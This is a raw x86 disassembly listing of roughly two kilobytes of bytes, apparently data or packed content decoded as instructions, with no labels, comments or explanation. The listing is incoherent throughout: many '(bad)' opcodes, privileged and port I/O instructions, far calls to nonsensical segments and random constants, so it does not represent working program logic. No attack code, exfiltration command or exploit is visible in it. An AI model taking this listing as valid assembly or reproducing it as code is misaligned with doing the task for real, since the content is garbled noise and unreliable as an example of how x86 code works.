  42351d:	or     ebp,DWORD PTR [ebp+0x5b]
  423520:	xchg   DWORD PTR [edi-0x71],edi
  423523:	jmp    0x5396:0x9a70a8
  42352a:	aam    0x8f
  42352c:	mov    ch,BYTE PTR ds:0x5c65a78e
  423532:	or     esp,DWORD PTR [ebx+0x7703f5f1]
  423538:	inc    eax
  423539:	mov    esi,0xe2f6d5bc
  42353e:	cdq    
  42353f:	fcmove st,st(5)
  423541:	push   esp
  423542:	out    dx,al
  423543:	jg     0x42351f
  423545:	pop    ebp
  423546:	dec    esi
  423547:	mov    ds:0xb4806d5f,al
  42354c:	mov    ecx,ebx
  42354e:	inc    edi
  42354f:	jno    0x4235ad
  423551:	ins    BYTE PTR es:[edi],dx
  423552:	call   0x6802:0xbb333523
  423559:	xchg   ecx,eax
  42355a:	stos   BYTE PTR es:[edi],al
  42355b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42355c:	bound  esp,QWORD PTR [edx]
  42355e:	dec    ebx
  42355f:	jle    0x4235d9
  423561:	sbb    esi,DWORD PTR [eax]
  423563:	adc    esi,DWORD PTR [edx+0x29edd1a7]
  423569:	aam    0x32
  42356b:	repz xchg esp,eax
  42356d:	or     al,0x5d
  42356f:	shr    edi,cl
  423571:	and    DWORD PTR [esi-0x79d3aa3a],ecx
  423577:	inc    edi
  423578:	push   ebx
  423579:	pusha  
  42357a:	xchg   esp,eax
  42357b:	cmp    BYTE PTR [eax+edx*8],ch
  42357e:	mov    ecx,0xbf328fc7
  423583:	mov    ebp,0x1bc80cbd
  423588:	idiv   BYTE PTR [edi-0x4]
  42358b:	xchg   eax,esi
  42358d:	sahf   
  42358e:	add    eax,0xafc4addf
  423593:	dec    ecx
  423594:	in     eax,dx
  423595:	cwde   
  423596:	fcomi  st,st(1)
  423598:	jbe    0x42356d
  42359a:	std    
  42359b:	lods   eax,DWORD PTR ds:[esi]
  42359c:	push   0xffffffc2
  42359e:	cmp    eax,0x218627a7
  4235a3:	js     0x423576
  4235a5:	rcr    DWORD PTR [ebx-0x1e],0xae
  4235a9:	xor    ah,ah
  4235ab:	mov    edx,0x7a963b2
  4235b0:	cdq    
  4235b1:	mov    ch,0xfc
  4235b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235b4:	clts   
  4235b6:	not    DWORD PTR [eax+0x7e]
  4235b9:	sbb    ebx,DWORD PTR [edx]
  4235bb:	(bad)  
  4235bc:	mov    dl,0x28
  4235be:	sbb    DWORD PTR [edi-0x57],esi
  4235c1:	pop    ebx
  4235c3:	icebp  
  4235c4:	cmp    al,0x7a
  4235c6:	and    BYTE PTR [edi-0x25b8a4e8],0x24
  4235cd:	cmp    DWORD PTR [ebx-0x64],ecx
  4235d0:	mov    dl,0xdc
  4235d2:	and    DWORD PTR [edx+edx*8],0xfffffff2
  4235d6:	dec    esp
  4235d7:	pop    es
  4235d8:	sbb    eax,0xfbd240b
  4235dd:	scas   al,BYTE PTR es:[edi]
  4235de:	out    dx,al
  4235df:	xor    BYTE PTR [ebx-0x33be87bc],dh
  4235e5:	adc    al,0x60
  4235e7:	mov    dl,0xad
  4235e9:	or     al,0x9f
  4235eb:	dec    ecx
  4235ec:	xor    cl,BYTE PTR [ecx+0x6f]
  4235ef:	iret   
  4235f0:	(bad)  
  4235f1:	and    al,0x5c
  4235f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235f4:	jmp    0xdfb7840a
  4235f9:	cmp    BYTE PTR [edx*8+0x5c9b4db2],dl
  423600:	or     eax,0x478c1ef8
  423605:	or     ebx,ebx
  423607:	push   ecx
  423608:	jae    0x42360b
  42360a:	clc    
  42360b:	je     0x423605
  42360d:	sti    
  42360e:	call   0x2892:0x3d78941c
  423615:	aaa    
  423616:	loopne 0x4235bc
  423618:	push   cs
  423619:	push   edx
  42361a:	jle    0x4235c4
  42361c:	aad    0x7a
  42361e:	adc    cl,bh
  423620:	cmp    dl,BYTE PTR [edi-0x334fad16]
  423626:	adc    eax,0x62c0d078
  42362b:	inc    edi
  42362c:	cmp    al,0x31
  42362e:	out    dx,eax
  42362f:	pop    ecx
  423630:	jle    0x42362b
  423632:	stos   DWORD PTR es:[edi],eax
  423633:	fidivr WORD PTR [ebx]
  423635:	or     eax,DWORD PTR [edi+0x5430b338]
  42363b:	jmp    DWORD PTR [edi-0x42f5654e]
  423641:	test   al,0xd9
  423643:	outs   dx,BYTE PTR ds:[esi]
  423644:	dec    ebp
  423645:	leave  
  423646:	sub    BYTE PTR [edi-0x6c210ccd],ah
  42364c:	hlt    
  42364d:	fwait
  42364e:	add    BYTE PTR [esi+0x998dbd1],cl
  423654:	sbb    cl,BYTE PTR [ebx+0xbe4d9f0]
  42365a:	aas    
  42365b:	mov    dl,0x89
  42365d:	retf   
  42365e:	xor    DWORD PTR [bp+si-0x7a],ebx
  423662:	call   0xb370:0xf949789f
  423669:	into   
  42366a:	fstp   DWORD PTR [ebx-0x1f]
  42366d:	jp     0x42367a
  42366f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423670:	jns    0x42367e
  423672:	(bad)  
  423673:	sbb    ebp,DWORD PTR [esi-0x37]
  423676:	out    dx,eax
  423677:	jle    0x42362b
  423679:	ror    DWORD PTR [ecx],cl
  42367b:	ror    ecx,cl
  42367d:	jnp    0x4236a8
  42367f:	jp     0x42366a
  423681:	or     ebx,eax
  423683:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  423685:	mov    ds:0x6e4ebd0f,eax
  42368a:	fwait
  42368b:	jno    0x423628
  42368d:	mov    al,0xa4
  42368f:	jns    0x42366e
  423691:	pop    es
  423692:	bound  esi,QWORD PTR [edx-0x3590f40d]
  423698:	sbb    al,0x1a
  42369a:	inc    edi
  42369b:	or     esi,DWORD PTR [edi+0x28d29ad7]
  4236a1:	cmp    ch,dh
  4236a3:	xchg   esp,eax
  4236a4:	mov    bl,0x4c
  4236a6:	bound  ebx,QWORD PTR [ebp-0x7d658d3b]
  4236ac:	iret   
  4236ad:	inc    edi
  4236ae:	dec    eax
  4236af:	push   ebp
  4236b0:	test   DWORD PTR [ecx-0x285a086d],0x69a9a634
  4236ba:	sbb    eax,0xe5a34630
  4236bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236c0:	mov    ebx,DWORD PTR [ebx]
  4236c2:	test   eax,0x92021122
  4236c7:	cwde   
  4236c8:	mov    dl,0xb2
  4236ca:	add    BYTE PTR [edx-0x4ad4a4fe],0x12
  4236d1:	repz stc 
  4236d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236d4:	xor    al,0x2c
  4236d6:	fdiv   DWORD PTR [esi+0x53]
  4236d9:	shl    ebp,1
  4236db:	cmp    BYTE PTR [edx+0x3a94d440],dh
  4236e1:	mov    ah,0xa0
  4236e3:	jnp    0x4236a1
  4236e5:	or     ebx,DWORD PTR [esi]
  4236e7:	fndisi(8087 only) 
  4236e9:	dec    ebp
  4236ea:	adc    al,0x82
  4236ec:	or     dl,BYTE PTR [ebx]
  4236ee:	call   0x598a:0x60531d62
  4236f5:	fmul   DWORD PTR [ebx-0x65]
  4236f8:	mov    al,ch
  4236fa:	or     ebp,esi
  4236fc:	jb     0x423702
  4236fe:	sub    al,0xad
  423700:	adc    eax,0xcb974366
  423705:	xchg   ebp,eax
  423706:	pop    eax
  423707:	adc    BYTE PTR [ecx+0x2b74436],dh
  42370d:	in     eax,0x4e
  42370f:	inc    edi
  423710:	inc    edx
  423711:	es loope 0x4236bb
  423714:	cmp    BYTE PTR [esi-0x4e],0xf6
  423718:	popf   
  423719:	adc    BYTE PTR ds:0xadc0b171,ah
  42371f:	adc    al,0x27
  423721:	mov    BYTE PTR [ecx+0x50],cl
  423724:	mov    dl,0x4
  423726:	sar    BYTE PTR [ebp+0x5e],cl
  423729:	or     ebx,DWORD PTR [ecx-0x33ebf0f6]
  42372f:	ds jnp 0x4236eb
  423732:	fwait
  423733:	xor    ecx,DWORD PTR [edx+0x4d]
  423736:	xchg   DWORD PTR [edx+edi*4],ecx
  423739:	mov    BYTE PTR [edx+0x9],0x96
  42373d:	or     ebp,ebp
  42373f:	jmp    0x4236d0
  423741:	pop    ss
  423742:	pop    ss
  423743:	shl    BYTE PTR ds:0xbb88784f,cl
  423749:	adc    al,0x2b
  42374b:	dec    edx
  42374c:	mov    al,0xb
  42374e:	cmp    edx,DWORD PTR [esi+0x29]
  423751:	pop    ebx
  423752:	cld    
  423753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423755:	pop    ecx
  423756:	shl    BYTE PTR [edx+0x53],1
  423759:	pop    ebp
  42375a:	push   0x79
  42375c:	add    BYTE PTR [esi+0x18b290e6],bl
  423762:	sti    
  423763:	push   0x70cf9cba
  423768:	sub    esi,DWORD PTR [esi]
  42376a:	test   BYTE PTR [ecx+0x3d828432],dh
  423770:	icebp  
  423771:	mov    ebx,0xa74848f2
  423776:	xchg   DWORD PTR [edx+0x60],ebp
  423779:	(bad)  
  42377a:	pop    ebx
  42377b:	or     DWORD PTR [ebx],0x54
  42377e:	mov    dl,0x22
  423780:	inc    ebp
  423781:	sti    
  423782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423783:	cmp    eax,0x33bc0bbd
  423788:	pop    esi
  423789:	repz mov ebp,0x9ac9e5e1
  42378f:	or     al,0xd8
  423791:	jo     0x4237ff
  423793:	cmc    
  423794:	pop    edi
  423795:	push   edx
  423796:	jmp    0x423738
  423798:	add    dh,dh
  42379a:	xchg   edi,eax
  42379b:	into   
  42379c:	ins    BYTE PTR es:[edi],dx
  42379d:	mov    ebx,0xae655a9
  4237a2:	xchg   esp,eax
  4237a3:	cs arpl si,ax
  4237a6:	mov    ah,0x0
  4237a8:	sub    ecx,esp
  4237aa:	call   0xbda4:0x96a78592
  4237b1:	jmp    FWORD PTR [eax]
  4237b3:	(bad)  
  4237b4:	jae    0x423740
  4237b6:	ja     0x42381f
  4237b8:	ret    
  4237b9:	mov    WORD PTR [edi-0x14],ds
  4237bc:	mov    dl,0xac
  4237be:	xor    al,0xf7
  4237c0:	imul   edx,DWORD PTR ds:0x7f2fdb3e,0xaa30a7fc
  4237ca:	push   esi
  4237cb:	and    DWORD PTR [eax+0x76],edi
  4237ce:	ins    DWORD PTR es:[edi],dx
  4237cf:	(bad)  
  4237d0:	mov    dl,0x61
  4237d2:	fnstenv [edi-0x1ac86373]
  4237d8:	sbb    ebp,DWORD PTR [edi]
  4237da:	inc    ecx
  4237db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237dc:	in     eax,dx
  4237dd:	xor    DWORD PTR [edx+0x4be9711a],ebx
  4237e3:	call   0x98bab4dd
  4237e8:	mov    dl,0x68
  4237ea:	(bad)  
  4237eb:	out    dx,al
  4237ec:	jmp    0x4237e7
  4237ee:	imul   esp,DWORD PTR [edi+ebx*1],0xd2a2260b
  4237f5:	push   eax
  4237f6:	mov    esi,0x9a175102
  4237fb:	retf   
  4237fc:	pop    edi
  4237fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237fe:	dec    esp
  4237ff:	scas   al,BYTE PTR es:[edi]
  423800:	or     esi,0xffffffe0
  423803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423804:	add    DWORD PTR [edx+0x4c940b1e],ecx
  42380a:	lods   al,BYTE PTR ds:[esi]
  42380b:	(bad)  
  42380c:	mov    esp,0x50dafc27
  423811:	dec    ebx
  423812:	cli    
  423813:	xor    esi,DWORD PTR [edx]
  423815:	or     BYTE PTR [eax-0x59],dh
  423818:	pop    es
  423819:	inc    edx
  42381a:	repnz cmp al,0x9f
  42381d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42381e:	dec    esp
  42381f:	push   ebp
  423820:	mov    dl,0xf5
  423822:	sar    BYTE PTR [edx],1
  423824:	xchg   esp,esi
  423826:	jbe    0x4237e5
  423828:	ja     0x423840
  42382a:	sub    eax,0x704bc49b
  42382f:	js     0x423853
  423831:	cmp    DWORD PTR [edi],edx
  423833:	xor    esi,DWORD PTR [edx+0x283f3bfb]
  423839:	add    DWORD PTR [edi-0x7a],0xfffffffe
  42383d:	adc    DWORD PTR ss:[edx+0x6c4652b2],edx
  423844:	retf   0xc6ff
  423847:	and    cl,BYTE PTR [edi+eiz*8-0x66]
  42384b:	adc    cl,BYTE PTR [ebx-0x4]
  42384e:	stos   BYTE PTR es:[edi],al
  42384f:	or     dh,BYTE PTR [edx]
  423851:	in     eax,0x9c
  423853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423854:	xchg   edx,eax
  423855:	shl    edi,cl
  423857:	dec    esi
  423858:	loop   0x423855
  42385a:	(bad)  
  42385b:	fdiv   QWORD PTR [edx-0x309e16ba]
  423861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423862:	div    BYTE PTR [ebp+0x49db0bf7]
  423868:	sub    bh,BYTE PTR [edi+0x7fbe052d]
  42386e:	call   0xaa84:0xede4a400
  423875:	repnz mov gs,ebx
  423878:	sub    eax,0xbdd59a5b
  42387d:	call   0xd6d3:0x97f42bc
  423884:	int    0xb
  423886:	xchg   ecx,eax
  423887:	push   eax
  423888:	imul   ebp,DWORD PTR [ebx-0x11],0x520f6100
  42388f:	add    esi,esp
  423891:	inc    ecx
  423892:	das    
  423893:	daa    
  423894:	cmp    BYTE PTR [ecx+0x38],dl
  423897:	and    BYTE PTR [ecx-0xae2b424],bh
  42389d:	or     al,0x18
  42389f:	outs   dx,BYTE PTR ds:[esi]
  4238a0:	adc    bh,BYTE PTR [esi-0x7d]
  4238a3:	ds jmp 0x4238b2
  4238a6:	mov    ebx,0xd8536134
  4238ab:	ja     0x423900
  4238ad:	mov    al,ds:0x91b2c9c8
  4238b2:	sbb    ch,BYTE PTR [edx+0x4e]
  4238b5:	cmp    edi,DWORD PTR [esi+ecx*4]
  4238b8:	dec    DWORD PTR [ebx]
  4238ba:	cmovno esi,DWORD PTR [edi-0xf]
  4238be:	(bad)  
  4238bf:	jo     0x42390e
  4238c1:	jne    0x42385d
  4238c3:	rcl    DWORD PTR [ecx+0x4300880d],cl
  4238c9:	scas   al,BYTE PTR es:[edi]
  4238ca:	outs   dx,BYTE PTR ds:[esi]
  4238cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238cc:	sahf   
  4238cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238ce:	arpl   di,ax
  4238d0:	jae    0x423893
  4238d2:	cmp    ebp,DWORD PTR [eax]
  4238d4:	pushf  
  4238d5:	mov    dl,0x3e
  4238d7:	fwait
  4238d8:	xchg   DWORD PTR [ebp*2+0x790d3201],edx
  4238df:	sti    
  4238e0:	xchg   ebp,eax
  4238e1:	xor    BYTE PTR [edx],bh
  4238e3:	shl    BYTE PTR [edi-0x209359f5],cl
  4238e9:	gs inc edi
  4238eb:	cdq    
  4238ec:	sbb    DWORD PTR [eax+esi*2-0x2b],eax
  4238f0:	mov    dl,0xdf
  4238f2:	(bad)  
  4238f3:	pop    ebx
  4238f4:	pusha  
  4238f5:	and    edi,edi
  4238f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238f8:	inc    ebx
  4238f9:	or     al,0xfb
  4238fb:	or     ebp,DWORD PTR [esi]
  4238fd:	stos   DWORD PTR es:[edi],eax
  4238fe:	jmp    0x4238a8
  423900:	xor    DWORD PTR [ecx-0x78],esi
  423903:	cmp    BYTE PTR [ecx-0x20],dh
  423906:	pop    edx
  423907:	shl    DWORD PTR [ebx],1
  423909:	dec    edx
  42390a:	call   0x5e6b:0xab2e568c
  423911:	test   BYTE PTR [esi-0x22b0c359],0x3
  423918:	(bad)  
  423919:	mov    edi,0x7db28e13
  42391e:	ss popf 
  423920:	shl    bl,cl
  423922:	pop    esi
  423923:	jle    0x423985
  423925:	or     ecx,DWORD PTR [edi]
  423927:	inc    edi
  423928:	pop    ss
  423929:	push   ecx
  42392a:	mov    edx,0x95093a6f
  42392f:	daa    
  423930:	or     al,0x2f
  423932:	iret   
  423933:	(bad)  
  423934:	xchg   ebx,eax
  423935:	cmp    eax,0xcb5f4cab
  42393a:	xor    ah,BYTE PTR [edx+0x44]
  42393d:	je     0x4238ed
  42393f:	mov    ds:0x8fb2eb2,al
  423944:	repz not ebp
  423947:	sbb    ch,BYTE PTR [ebx+ecx*1-0x1c]
  42394b:	jp     0x423973
  42394d:	add    edx,DWORD PTR [edx]
  42394f:	stc    
  423950:	jmp    0xda10:0xf7879533
  423957:	(bad)  
  423958:	mov    al,ds:0x3c92f2a4
  42395d:	aaa    
  42395e:	adc    ebp,DWORD PTR [edx+0x4f99c732]
  423964:	adc    DWORD PTR [ebx+0x5d5836be],ecx
  42396a:	fwait
  42396b:	scas   eax,DWORD PTR es:[edi]
  42396c:	cli    
  42396d:	ins    DWORD PTR es:[edi],dx
  42396e:	retf   
  42396f:	xchg   esp,eax
  423970:	popa   
  423971:	nop
  423972:	stos   BYTE PTR es:[edi],al
  423973:	pusha  
  423974:	(bad)  
  423976:	jae    0x423949
  423978:	jge    0x423985
  42397a:	(bad)  
  42397b:	enter  0xc596,0x25
  42397f:	mov    ecx,0xae943fe0
  423984:	xchg   ebx,eax
  423985:	(bad)  
  423986:	mov    edi,0xb03ad784
  42398b:	ds mov edi,0xa4f95ee1
  423991:	(bad)  
  423993:	jbe    0x42395f
  423995:	scas   al,BYTE PTR es:[edi]
  423996:	xchg   esp,eax
  423997:	addr16 std 
  423999:	mov    edx,0x6a881c5a
  42399e:	aaa    
  42399f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239a0:	adc    eax,0xcc26a038
  4239a5:	adc    DWORD PTR [esi-0x46],esi
  4239a8:	(bad)  
  4239a9:	dec    BYTE PTR [ebx-0x2a349688]
  4239af:	push   es
  4239b0:	sar    DWORD PTR [ecx-0x19],1
  4239b3:	pop    eax
  4239b4:	mov    dl,0x23
  4239b6:	jmp    0x42395a
  4239b8:	out    0x56,al
  4239ba:	ss hlt 
  4239bc:	mov    edx,0xfaa7c29b
  4239c1:	dec    esi
  4239c2:	aad    0xe9
  4239c4:	imul   edx,edx,0x30ae99cd
  4239ca:	pop    ebx
  4239cb:	in     al,0xf2
  4239cd:	mov    bl,0xa7
  4239cf:	inc    esi
  4239d0:	les    ecx,FWORD PTR [esp+ecx*2]
  4239d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239d4:	dec    edx
  4239d5:	out    0x86,al
  4239d7:	test   DWORD PTR [ebp+0x6547529c],edx
  4239dd:	jbe    0x423984
  4239df:	out    0x18,eax
  4239e1:	mov    edx,DWORD PTR [edx]
  4239e3:	(bad)  
  4239e7:	jecxz  0x423992
  4239e9:	or     BYTE PTR [esi-0x329d84bf],dh
  4239ef:	in     al,dx
  4239f0:	pop    edx
  4239f1:	xchg   ebp,eax
  4239f2:	nop
  4239f3:	jl     0x4239b1
  4239f5:	pop    es
  4239f6:	fmul   DWORD PTR [edx-0x7e797451]
  4239fc:	outs   dx,BYTE PTR ds:[esi]
  4239fd:	retf   0xb493
  423a00:	and    ch,BYTE PTR cs:[edi]
  423a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a04:	mov    esi,0x29eff74e
  423a09:	sbb    dh,BYTE PTR [eax+edx*1+0x159a5f8a]
  423a10:	and    eax,0x558cb095
  423a15:	or     ebp,DWORD PTR [eax-0x17]
  423a18:	mov    DWORD PTR [edx],esi
  423a1a:	fisub  DWORD PTR [edx-0x2e6539b9]
  423a20:	mov    eax,0x404f69d
  423a25:	test   DWORD PTR [edi],esp
  423a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a28:	and    ebp,eax
  423a2a:	test   cl,ah
  423a2c:	add    eax,0xb2647e03
  423a31:	(bad)  
  423a32:	out    0x6c,al
  423a34:	aaa    
  423a35:	outs   dx,BYTE PTR ds:[esi]
  423a36:	iret   
  423a37:	into   
  423a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a39:	xor    al,0x3e
  423a3b:	cdq    
  423a3c:	mov    dl,0x99
  423a3e:	data16 cli 
  423a40:	popf   
  423a41:	aad    0xd9
  423a43:	cld    
  423a44:	mov    dl,0x2b
  423a46:	pop    ebp
  423a47:	sub    bl,BYTE PTR [edx-0x4e76464e]
  423a4d:	std    
  423a4e:	dec    edx
  423a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a50:	xor    ch,dh
  423a52:	test   cl,dl
  423a54:	cmc    
  423a55:	inc    BYTE PTR [ecx]
  423a57:	(bad)  [edx]
  423a59:	pop    ss
  423a5a:	mov    esp,0x9acfff38
  423a5f:	xchg   BYTE PTR [edx],cl
  423a61:	not    DWORD PTR [edx]
  423a63:	(bad)
  423a66:	pop    ss
  423a67:	sub    edx,DWORD PTR ds:0xf1e58764
  423a6d:	aas    
  423a6e:	call   0x223:0xed411b68
  423a75:	adc    al,0xec
  423a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a78:	pop    ds
  423a79:	mov    ch,0x53
  423a7b:	fwait
  423a7c:	out    0x9b,al
  423a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a7f:	mov    bl,cl
  423a81:	mov    WORD PTR [edx+0x45bc23c],ds
  423a87:	pusha  
  423a88:	icebp  
  423a89:	push   0xc805f84
  423a8e:	frstor [ebx-0x18e03bc4]
  423a94:	imul   esi,DWORD PTR [ebp-0x574712e8],0xbdb39257
  423a9e:	call   0x9a53:0xc0632e20
  423aa5:	or     ebp,esi
  423aa7:	popa   
  423aa8:	lods   al,BYTE PTR ds:[esi]
  423aa9:	mov    al,0xdd
  423aab:	lds    ecx,FWORD PTR [ebx-0x75]
  423aae:	call   0xb3a8:0x6db2c064
  423ab5:	fbstp  TBYTE PTR [edi]
  423ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ab8:	pop    edx
  423ab9:	ins    DWORD PTR es:[edi],dx
  423aba:	jge    0x423a94
  423abc:	loop   0x423b15
  423abe:	(bad)  
  423abf:	sbb    DWORD PTR [edx+eiz*1+0x3bb2c210],ebp
  423ac6:	push   ss
  423ac7:	loop   0x423b09
  423ac9:	imul   ecx,DWORD PTR [edi+eiz*4],0xffffffd3
  423acd:	(bad)  
  423ace:	es xchg ecx,eax
  423ad0:	fstp   DWORD PTR [ecx-0x6f]
  423ad3:	pop    eax
  423ad4:	push   eax
  423ad5:	rcr    DWORD PTR [ebx+0x1a985949],1
  423adb:	mov    esp,0xfbab042b
  423ae0:	push   ebp
  423ae1:	enter  0xa777,0x7a
  423ae5:	mov    edi,0x9c5460a9
  423aea:	and    esp,ebx
  423aec:	mov    cl,0x80
  423aee:	jae    0x423a93
  423af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423af1:	cld    
  423af2:	sbb    BYTE PTR [edi-0x2],bl
  423af5:	data16 mov BYTE PTR [edi+0x5731a172],ah
  423afc:	sbb    ecx,eax
  423afe:	scas   al,BYTE PTR es:[edi]
  423aff:	mov    DWORD PTR [ecx+0x232467c0],esi
  423b05:	into   
  423b06:	mov    DWORD PTR [edi],esp
  423b08:	(bad)  
  423b09:	addr16 in eax,dx
  423b0b:	test   eax,0xf68ab102
  423b10:	shl    BYTE PTR [esi+0x33c05f1a],cl
  423b16:	pusha  
  423b17:	shl    DWORD PTR [edx+0x5b818c6b],cl
  423b1d:	adc    ch,cl
  423b1f:	(bad)  
  423b20:	hlt    
  423b21:	add    al,0x51
  423b23:	xchg   DWORD PTR [ecx],ebp
  423b25:	aad    0xfa
  423b27:	outs   dx,BYTE PTR ds:[esi]
  423b28:	fist   WORD PTR [ebx]
  423b2a:	inc    ebx
  423b2b:	call   0x4be7f9e2
  423b30:	mov    ebp,0x53ea02a3
  423b35:	or     al,0xca
  423b37:	mov    ah,0x5
  423b39:	sbb    eax,0xf132fccd
  423b3e:	out    dx,al
  423b3f:	jle    0x423acf
  423b41:	cwd    
  423b43:	and    cl,dh
  423b45:	pop    esi
  423b46:	sbb    cl,ch
  423b48:	jne    0x423afc
  423b4a:	mov    ch,0xe6
  423b4c:	push   edx
  423b4d:	mov    bl,0x6d
  423b4f:	test   al,0xc8
  423b51:	popf   
  423b52:	lahf   
  423b53:	xor    DWORD PTR [ebx],0x54378696
  423b59:	repz cmp edx,DWORD PTR [esi-0x757368f6]
  423b60:	inc    esp
  423b61:	ret    0x209a
  423b64:	icebp  
  423b65:	lods   al,BYTE PTR ds:[esi]
  423b66:	jp     0x423b57
  423b68:	int    0x0
  423b6a:	test   eax,0x950c3ced
  423b6f:	xchg   DWORD PTR [eax],esi
  423b71:	cmp    BYTE PTR [ebp+0x81b72a3],0x75
  423b78:	mov    dl,0x1
  423b7a:	and    ebp,DWORD PTR [ebx+0x6e]
  423b7d:	xor    DWORD PTR [esi],ebx
  423b7f:	call   0xb61:0x6e452fa5
  423b86:	arpl   WORD PTR [esi-0x12ec77ae],cx
  423b8c:	dec    esi
  423b8d:	sbb    BYTE PTR [edx+0x39830953],0xaa
  423b94:	jle    0x423b25
  423b96:	push   0xffffffab
  423b98:	pop    ds
  423b99:	inc    edx
  423b9a:	pop    ds
  423b9b:	imul   edx,DWORD PTR [esi+edx*1-0x66],0xee22ed4b
  423ba3:	test   DWORD PTR [edi-0x41],ebp
  423ba6:	pop    eax
  423ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ba8:	js     0x423b41
  423baa:	add    BYTE PTR [edx],dh
  423bac:	jmp    0x2dcd:0xb23c9ead
  423bb3:	and    BYTE PTR [ebp+0xfeb2a37],dl
  423bb9:	jmp    0xc7abe2f6
  423bbe:	mov    WORD PTR [esi],ss
  423bc0:	les    eax,FWORD PTR [edx+ebx*2-0x52]
  423bc4:	mov    dl,0xb9
  423bc6:	outs   dx,BYTE PTR ds:[esi]
  423bc7:	pop    ebx
  423bc8:	sahf   
  423bc9:	icebp  
  423bca:	addr16 mov bl,0xe2
  423bcd:	or     esp,DWORD PTR [ebx]
  423bcf:	mov    al,dh
  423bd1:	dec    BYTE PTR [ebx+edx*1+0x6f9a81ba]
  423bd8:	cli    
  423bd9:	adc    BYTE PTR [esi+0x22],ah
  423bdc:	neg    ecx
  423bde:	push   edi
  423bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423be0:	popa   
  423be1:	sbb    BYTE PTR [esi],dl
  423be3:	call   ebp
  423be5:	sahf   
  423be6:	add    BYTE PTR [edi],dh
  423be8:	mov    dl,0x62
  423bea:	repnz cmp DWORD PTR [ebx],0x79854d05
  423bf1:	or     ebx,edi
  423bf3:	lds    edx,FWORD PTR [eax]
  423bf5:	cli    
  423bf6:	stc    
  423bf7:	scas   al,BYTE PTR es:[edi]
  423bf8:	jge    0x423c28
  423bfa:	call   0x7152:0xda9a50aa
  423c01:	sbb    ebx,edx
  423c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c04:	ret    
  423c05:	mov    ah,0x1f
  423c07:	pop    esi
  423c08:	mov    ch,0x77
  423c0a:	shl    edx,1
  423c0c:	pushf  
  423c0d:	(bad)  
  423c0e:	fnstenv [edi]
  423c10:	mov    dl,0x80
  423c12:	int    0xda
  423c14:	jge    0x423be9
  423c16:	ficomp DWORD PTR [ebp+0x6e9ae37c]
  423c1c:	and    dl,BYTE PTR [eax]
  423c1e:	sub    bh,BYTE PTR [ecx-0x697be948]
  423c24:	sti    
  423c25:	dec    esi
  423c26:	ficomp DWORD PTR [ebx+0x2f24fc01]
  423c2c:	push   es
  423c2d:	aaa    
  423c2e:	inc    ebx
  423c2f:	mov    DWORD PTR [edx-0x30b193b9],esi
  423c35:	outs   dx,BYTE PTR ds:[esi]
  423c36:	sub    esi,DWORD PTR [edi-0x4e]
  423c39:	and    al,0xe5
  423c3b:	xor    BYTE PTR ds:0xd4621905,0xb
  423c42:	xchg   ebx,eax
  423c43:	fadd   st(2),st
  423c45:	adc    BYTE PTR [edx],al
  423c47:	pop    eax
  423c48:	dec    ecx
  423c49:	das    
  423c4a:	call   0xa579:0x2e1344cf
  423c51:	and    DWORD PTR [ecx],esi
  423c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c54:	mov    ebp,DWORD PTR [ebx+0x30]
  423c57:	mov    esi,0x151f0390
  423c5c:	mov    dl,0x93
  423c5e:	mov    BYTE PTR [edi],0x6f
  423c61:	je     0x423c5c
  423c63:	cmp    eax,DWORD PTR [edi-0x1fa874f5]
  423c69:	sbb    ebp,DWORD PTR [edx-0x6599e9ce]
  423c6f:	sbb    DWORD PTR [esi-0x2c],esp
  423c72:	jmp    0x74ef97bc
  423c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c78:	dec    edx
  423c79:	mov    BYTE PTR [edx+0x3262ad74],dh
  423c7f:	ret    
  423c80:	mov    dl,0x33
  423c82:	mov    al,0x1f
  423c84:	test   eax,0x1ed86b36
  423c89:	or     edx,DWORD PTR [ecx+0x1d]
  423c8c:	and    DWORD PTR ds:0x885ec242,edi
  423c92:	call   0x3f3d:0x58df7482
  423c99:	fisub  WORD PTR [edi-0x75824632]
  423ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ca1:	gs js  0x423ca4
  423ca4:	mov    esp,0xb8313cab
  423ca9:	or     bh,ah
  423cab:	xchg   esp,eax
  423cac:	test   BYTE PTR [ebx+0xbb50ffb],dl
  423cb2:	sub    esp,DWORD PTR [ebp+0x23]
